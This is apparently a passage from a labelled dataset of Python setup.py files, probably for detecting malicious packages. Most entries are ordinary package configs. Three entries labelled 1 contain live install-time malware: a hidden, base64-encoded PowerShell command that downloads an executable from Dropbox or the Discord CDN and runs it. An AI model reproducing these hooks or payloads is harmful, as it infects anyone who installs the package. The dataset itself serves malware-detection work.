Software Development :: Libraries\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    install_requires=[],\n    python_requires=\">=3.6,<4\",\n    packages=find_packages(\"src\"),\n    package_dir={\"\": \"src\"},\n    # PEP-561: https://www.python.org/dev/peps/pep-0561/\n    package_data={\"graphql\": [\"py.typed\"]},\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "flake8-pyi-22.8.1", "func": "# Copyright (C) 2016 \u0141ukasz Langa\n\nimport ast\nimport os\nimport re\nimport sys\n\nfrom setuptools import setup\n\nassert sys.version_info >= (3, 7, 0), \"flake8-pyi requires Python 3.7+\"\n\n\ncurrent_dir = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(current_dir, \"README.md\"), encoding=\"utf8\") as ld_file:\n    long_description = ld_file.read()\n\n\n_version_re = re.compile(r\"__version__\\s+=\\s+(?P<version>.*)\")\n\n\nwith open(os.path.join(current_dir, \"pyi.py\"), \"r\") as f:\n    version = _version_re.search(f.read()).group(\"version\")\n    version = str(ast.literal_eval(version))\n\n\nsetup(\n    name=\"flake8-pyi\",\n    version=version,\n    description=\"A plugin for flake8 to enable linting .pyi files.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    keywords=\"flake8 pyi bugs pyflakes pylint linter qa\",\n    author=\"\u0141ukasz Langa\",\n    author_email=\"lukasz@langa.pl\",\n    url=\"https://github.com/ambv/flake8-pyi\",\n    license=\"MIT\",\n    py_modules=[\"pyi\"],\n    zip_safe=False,\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"flake8 >= 3.2.1, < 6.0.0\",\n        \"pyflakes >= 2.1.1\",\n        'ast-decompiler <1.0; python_version < \"3.9\"',\n    ],\n    test_suite=\"tests.test_pyi\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Environment :: Console\",\n        \"Framework :: Flake8\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n    entry_points={\"flake8.extension\": [\"Y0 = pyi:PyiTreeChecker\"]},\n)\n", "target": 0}
{"idx": "py-pushintelhydra-9.55", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pushintelhydra',\n    packages = ['modlib'],\n    version = '4.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ec2-metadata-2.10.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "delighted-4.1.0", "func": "import re\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nversion = ''\nwith open('delighted/__init__.py', 'r') as fd:\n    version = re.search(r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]*)[\\'\"]', fd.read(),\n                        re.MULTILINE).group(1)\nif not version:\n    raise RuntimeError('Cannot find version information')\n\nsetup(\n    name='delighted',\n    version=version,\n    description='Delighted API Python Client.',\n    long_description_content_type='text/markdown',\n    long_description=open('README.md').read(),\n    author='Ben Turner, Robby Colvin',\n    author_email='ben@delighted.com',\n    url='https://delighted.com/',\n    packages=['delighted'],\n    package_dir={'delighted': 'delighted'},\n    install_requires=['six', 'requests', 'tzlocal'],\n    test_suite='test',\n    test_requires=['mock', 'pytz', 'tzlocal'],\n    license='MIT',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n)\n", "target": 0}
{"idx": "google-cloud-memcache-1.4.1", "func": "# -*- coding: utf-8 -*-\n\n# Copyright (C) 2019  Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-memcache\"\ndescription = \"Memorystore for Memcached API client library\"\nversion = \"1.4.1\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nurl = \"https://github.com/googleapis/python-memcache\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=url,\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    python_requires=\">=3.7\",\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "docarray-0.15.0", "func": "import sys\nfrom os import path\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\nif sys.version_info < (3, 7, 0):\n    raise OSError(f'DocArray requires Python >=3.7, but yours is {sys.version}')\n\ntry:\n    pkg_name = 'docarray'\n    libinfo_py = path.join(pkg_name, '__init__.py')\n    libinfo_content = open(libinfo_py, 'r', encoding='utf8').readlines()\n    version_line = [l.strip() for l in libinfo_content if l.startswith('__version__')][\n        0\n    ]\n    exec(version_line)  # gives __version__\nexcept FileNotFoundError:\n    __version__ = '0.0.0'\n\ntry:\n    with open('README.md', encoding='utf8') as fp:\n        _long_description = fp.read()\nexcept FileNotFoundError:\n    _long_description = ''\n\nsetup(\n    name=pkg_name,\n    packages=find_packages(),\n    version=__version__,\n    include_package_data=True,\n    description='The data structure for unstructured data',\n    author='Jina AI',\n    author_email='hello@jina.ai',\n    license='Apache 2.0',\n    url='https://github.com/jina-ai/docarray',\n    download_url='https://github.com/jina-ai/docarray/tags',\n    long_description=_long_description,\n    long_description_content_type='text/markdown',\n    zip_safe=False,\n    setup_requires=['setuptools>=18.0', 'wheel'],\n    install_requires=['numpy', 'rich>=12.0.0'],\n    extras_require={\n        # req usage, please see https://docarray.jina.ai/#install\n        'common': [\n            'protobuf>=3.13.0,<=3.20.1',\n            'lz4',\n            'requests',\n            'matplotlib',\n            'Pillow',\n            'fastapi',\n            'uvicorn',\n            'jina-hubble-sdk>=0.11.0',\n        ],\n        'full': [\n            'protobuf>=3.13.0,<=3.20.1',\n            'lz4',\n            'requests',\n            'matplotlib',\n            'Pillow',\n            'trimesh',\n            'scipy',\n            'jina-hubble-sdk>=0.10.0',\n            'av',\n            'fastapi',\n            'uvicorn',\n            'strawberry-graphql',\n            'weaviate-client~=3.3.0',\n            'annlite>=0.3.2',\n            'qdrant-client~=0.7.3',\n            'elasticsearch>=8.2.0',\n        ],\n        'qdrant': [\n            'qdrant-client~=0.7.3',\n        ],\n        'annlite': [\n            'annlite>=0.3.2',\n        ],\n        'weaviate': [\n            'weaviate-client~=3.3.0',\n        ],\n        'elasticsearch': [\n            'elasticsearch>=8.2.0',\n        ],\n        'test': [\n            'pytest',\n            'pytest-timeout',\n            'pytest-mock',\n            'pytest-cov',\n            'pytest-repeat',\n            'pytest-reraise',\n            'mock',\n            'pytest-custom_exit_code',\n            'black==22.3.0',\n            'tensorflow==2.7.0',\n            'paddlepaddle==2.2.0',\n            'torch==1.9.0',\n            'torchvision==0.10.0',\n            'datasets',\n            'onnx',\n            'onnxruntime',\n            'jupyterlab',\n            'transformers>=4.16.2',\n            'weaviate-client~=3.3.0',\n            'annlite>=0.3.2',\n            'elasticsearch>=8.2.0',\n            'jina',\n        ],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Unix Shell',\n        'Environment :: Console',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Topic :: Database :: Database Engines/Servers',\n        'Topic :: Scientific/Engineering :: Artificial Intelligence',\n        'Topic :: Internet :: WWW/HTTP :: Indexing/Search',\n        'Topic :: Scientific/Engineering :: Image Recognition',\n        'Topic :: Multimedia :: Video',\n        'Topic :: Scientific/Engineering',\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    project_urls={\n        'Documentation': 'https://docarray.jina.ai',\n        'Source': 'https://github.com/jina-ai/docarray/',\n        'Tracker': 'https://github.com/jina-ai/docarray/issues',\n    },\n    keywords='docarray deep-learning data-structures cross-modal multi-modal unstructured-data nested-data neural-search',\n)\n", "target": 0}
{"idx": "google-cloud-orchestration-airflow-1.4.1", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-orchestration-airflow\"\ndescription = \"Cloud Composer API client library\"\nversion = \"1.4.1\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\nurl = \"https://github.com/googleapis/python-orchestration-airflow\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=url,\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    python_requires=\">=3.7\",\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "pullload-1.24", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pullload',\n    packages = ['modlib'],\n    version = '9.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geventhttpclient-2.0", "func": "import sys\nfrom distutils.core import setup\nfrom setuptools.extension import Extension\nfrom setuptools import find_packages\n\nDESC = \"\"\"\nA high performance, concurrent HTTP client library for python using gevent.\n\ngevent.httplib support was removed in gevent 1.0, geventhttpclient now\nprovides that missing functionality.\n\ngeventhttpclient uses a fast http parser, written in C, originating from\nnginx, extracted and modified by Joyent.\n\ngeventhttpclient has been specifically designed for high concurrency,\nstreaming and support HTTP 1.1 persistent connections. More generally it is\ndesigned for efficiently pulling from REST APIs and streaming APIs\nlike Twitter's.\n\nSafe SSL support is provided by default. geventhttpclient depends on\nthe certifi CA Bundle. This is the same CA Bundle which ships with the\nRequests codebase, and is derived from Mozilla Firefox's canonical set.\n\nAs of 1.5, only Python 3.6+ is fully supported (with prebuilt wheels), \nbut Python 2.7 and 3.5 *should* work too.\n\nUse of SSL/TLS with python 2.7.9 is not recommended and may be broken.\n\"\"\"\n\nhttpparser = Extension(\n    'geventhttpclient._parser',\n    sources=[\n        'ext/_parser.c',\n        'ext/api.c',\n        'ext/http.c',\n        'ext/llhttp.c',\n    ],\n)\n\nrequirements = [\n    'gevent >= 0.13',\n    'certifi',\n    'six',\n    'brotli'\n]\n\nif sys.hexversion < 0x02070900:\n    requirements += [\n        'backports.ssl_match_hostname',\n    ]\n\nsetup(name='geventhttpclient',\n      version = '2.0',\n      description = 'http client library for gevent',\n      long_description = DESC,\n      url=\"http://github.com/gwik/geventhttpclient\",\n      author=\"Antonin Amand\",\n      author_email=\"antonin.amand@gmail.com\",\n      packages=find_packages('src'),\n      exclude_package_data={'geventhttpclient': ['tests/*']},\n      license='MIT',\n      package_dir={'': 'src'},\n      ext_modules = [httpparser],\n      include_package_data=True,\n      install_requires=requirements)\n", "target": 0}
{"idx": "enum-0.4.7", "func": "#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# setup.py\n# Part of \u2018enum\u2019, a package providing enumerated types for Python.\n#\n# Copyright \u00a9 2007\u20132018 Ben Finney <ben+python@benfinney.id.au>\n# This is free software: you may copy, modify, and/or distribute this work\n# under the terms of the GNU General Public License as published by the\n# Free Software Foundation; version 3 of that license or any later version.\n# No warranty expressed or implied. See the file \u2018LICENSE.GPL-3\u2019 for details.\n\n\"\"\" Python distutils setup for \u2018enum\u2019 distribution.\n    \"\"\"\n\nimport textwrap\n\nfrom setuptools import setup, find_packages\n\n\f\ndistribution_name = \"enum\"\nmain_module_name = 'enum'\nmain_module = __import__(main_module_name)\nversion = main_module.__version__\n\nmain_module_doc = main_module.__doc__.decode('utf-8')\nshort_description, long_description = (\n    textwrap.dedent(desc).strip()\n    for desc in main_module_doc.split('\\n\\n', 1)\n    )\n\ndeprecation_text = textwrap.dedent(\"\"\"\\\n    ..  Important:: Superseded by Python standard library.\n\n        Python 3 now has in its standard library an `enum`_\n        implementation (also available for older Python versions as\n        the third-party `enum34`_ distribution) that supersedes this\n        library.\n\n        ..  _enum: https://docs.python.org/3/library/enum.html\n        ..  _enum34: https://pypi.org/project/enum34/\n\n    \"\"\")\nlong_description = deprecation_text + long_description\n\n\f\nsetup(\n    name=distribution_name,\n    version=version,\n    packages=find_packages(exclude=[\"test\"]),\n    py_modules=[main_module_name],\n\n    # Setuptools metadata.\n    zip_safe=False,\n    install_requires=[\n        \"setuptools\",\n        ],\n    test_suite=\"test.test_enum.suite\",\n\n    # PyPI metadata.\n    author=main_module.__author_name__,\n    author_email=main_module.__author_email__,\n    description=short_description,\n    license=main_module.__license__,\n    keywords=\"enum enumerated enumeration\",\n    url=main_module.__url__,\n    long_description=long_description,\n    classifiers=[\n        # Reference: <URL:https://pypi.org/classifiers/>\n        \"Development Status :: 4 - Beta\",\n        \"License :: OSI Approved :: GNU General Public License (GPL)\",\n        \"Programming Language :: Python :: 2\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Operating System :: OS Independent\",\n        \"Intended Audience :: Developers\",\n        ],\n    )\n\n\f\n# Local variables:\n# mode: python\n# End:\n# vim: filetype=python fileencoding=utf-8 :\n", "target": 0}
{"idx": "flask-swagger-0.2.14", "func": "try:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nwith open('README') as file:\n    long_description = file.read()\n\nsetup(name='flask-swagger',\n      version='0.2.14',\n      url='https://github.com/gangverk/flask-swagger',\n      description='Extract swagger specs from your flask project',\n      author='Atli Thorbjornsson',\n      license='MIT',\n      py_modules=['flask_swagger', 'build_swagger_spec'],\n      long_description=long_description,\n      install_requires=['Flask>=0.10', 'PyYAML>=5.1'],\n      classifiers=[\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n      ],\n      entry_points = \"\"\"\n      [console_scripts]\n      flaskswagger = build_swagger_spec:run\n      \"\"\",\n      options={\n        'bdist_rpm':{\n          'build_requires':[\n            'python',\n            'python-setuptools',\n            'python-itsdangerous',\n            'python-flask',\n            'python-markupsafe',\n            'PyYAML',\n          ],\n          'requires':[\n            'python',\n            'python-setuptools',\n            'python-itsdangerous',\n            'python-flask',\n            'python-markupsafe',\n            'PyYAML',\n          ],\n        },\n      },\n      )\n", "target": 0}
{"idx": "google-cloud-texttospeech-2.12.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-texttospeech\"\ndescription = \"Google Cloud Text-to-Speech API client library\"\nversion = \"2.12.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-texttospeech\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "tppingvercv-1.94", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppingvercv',\n    packages = ['modlib'],\n    version = '9.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dotty_dict-1.3.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['dotty_dict']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'dotty-dict',\n    'version': '1.3.1',\n    'description': 'Dictionary wrapper for quick access to deeply nested keys.',\n    'long_description': \"**********\\nDotty-Dict\\n**********\\n\\n:Info: Dictionary wrapper for quick access to deeply nested keys.\\n:Author: Pawel Zadrozny @pawelzny <pawel.zny@gmail.com>\\n\\n.. image:: https://circleci.com/gh/pawelzny/dotty_dict/tree/master.svg?style=shield&circle-token=77f51e87481f339d69ca502fdbb0c2b1a76c0369\\n   :target: https://circleci.com/gh/pawelzny/dotty_dict/tree/master\\n   :alt: CI Status\\n\\n.. image:: https://readthedocs.org/projects/vo/badge/?version=latest\\n   :target: http://dotty-dict.readthedocs.io/en/latest/?badge=latest\\n   :alt: Documentation Status\\n\\n.. image:: https://img.shields.io/pypi/v/dotty_dict.svg\\n   :target: https://pypi.org/project/dotty_dict/\\n   :alt: PyPI Repository Status\\n\\n.. image:: https://img.shields.io/github/release/pawelzny/dotty_dict.svg\\n   :target: https://github.com/pawelzny/dotty_dict\\n   :alt: Release Status\\n\\n.. image:: https://img.shields.io/pypi/status/dotty_dict.svg\\n   :target: https://pypi.org/project/dotty_dict/\\n   :alt: Project Status\\n\\n.. image:: https://img.shields.io/pypi/pyversions/dotty_dict.svg\\n   :target: https://pypi.org/project/dotty_dict/\\n   :alt: Supported python versions\\n\\n.. image:: https://img.shields.io/pypi/implementation/dotty_dict.svg\\n   :target: https://pypi.org/project/dotty_dict/\\n   :alt: Supported interpreters\\n\\n.. image:: https://img.shields.io/pypi/l/dotty_dict.svg\\n   :target: https://github.com/pawelzny/dotty_dict/blob/master/LICENSE\\n   :alt: License\\n\\n\\nFeatures\\n========\\n\\n* Simple wrapper around python dictionary and dict like objects\\n* Two wrappers with the same dict are considered equal\\n* Access to deeply nested keys with dot notation: ``dot['deeply.nested.key']``\\n* Create, read, update and delete nested keys 